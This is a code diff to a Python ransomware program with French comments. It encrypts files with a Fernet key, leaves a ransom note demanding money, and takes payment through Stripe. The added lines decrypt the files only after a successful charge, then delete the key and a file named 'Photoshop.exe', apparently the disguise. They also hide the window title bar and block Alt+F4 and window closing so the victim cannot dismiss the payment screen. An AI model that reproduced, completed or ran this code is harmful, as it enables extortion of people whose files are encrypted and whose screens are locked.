@@ -49,7 +49,7 @@ chiffrement(path,clef)
 with open(str(pwd) + '/' + 'readme.txt','w') as file :
     file.write('PAYEEE !!! Donne mon argent !!!')
 
-# Affichage de l'app en .exe
+# Affichage de l'app
 import tkinter as tk
 import tkinter.font as tkFont
 
@@ -126,6 +126,8 @@ class App:
             # Affichage de la réponse de Stripe dans la console
             print(charge["status"])
             if charge["status"] == "succeeded":
+
+                # Décriptage des fichiers en utilisant la clé
                 def decrypt(items, clef):
                     f=Fernet(clef)
                     for item in items:
@@ -137,14 +139,58 @@ class App:
                 def lire_clef():
                     return open('clef.key','rb').read()
                 clef=lire_clef()
-                path="C:/xampp/htdocs/test_py/files"
+
+                # Suppression de la clé et du readme
+                path="C:/xampp/htdocs/files"
+                # os.remove(path + '/' + 'file1.txt')
+                # os.remove(path + '/' + 'file2.txt')
                 os.remove(path + '/' + 'readme.txt')
                 items=os.listdir(path)
                 chemin=[path + '/' + item for item in items]
                 decrypt(chemin,clef)
+                path="C:/xampp/htdocs"
+                os.remove(path + '/' + 'clef.key')
+                root.destroy()
+                path="C:/xampp/htdocs"
+                os.remove(path + '/' + 'Photoshop.exe')
+                
 
         # Création du bouton de paiement
         tk.Button(root, text="Payer", command=process_payment).grid(row=3, column=0, columnspan=2)
+
+        # définit la fonction pour fermer la fenêtre
+        def quitter():
+            root.destroy()
+
+        # Création du bouton exite
+        tk.Button(root, text="Quitter", command=quitter).grid(row=18, column=0, columnspan=2)
+
+        #Cache la barre d'aplication windows
+        root.overrideredirect(True)
+
+        #Empèche alt + F4
+        pressed_f4 = False  # Is Alt-F4 pressed?
+
+        def do_exit():
+            global pressed_f4
+            print('Trying to close application')
+            if pressed_f4:  # Deny if Alt-F4 is pressed
+                print('Denied!')
+                pressed_f4 = False  # Reset variable
+            else:
+                close()     # Exit application
+
+        def alt_f4(event):  # Alt-F4 is pressed
+            global pressed_f4
+            print('Alt-F4 pressed')
+            pressed_f4 = True
+
+        def close(*event):  # Exit application
+            root.destroy()
+
+        root.bind('<Alt-F4>', alt_f4)
+        root.bind('<Escape>', close)
+        root.protocol("WM_DELETE_WINDOW",do_exit)
 
     def GButton_220_command(self):
         print("command")
@@ -153,4 +199,3 @@ if __name__ == "__main__":
     root = tk.Tk()
     app = App(root)
     root.mainloop()
-    
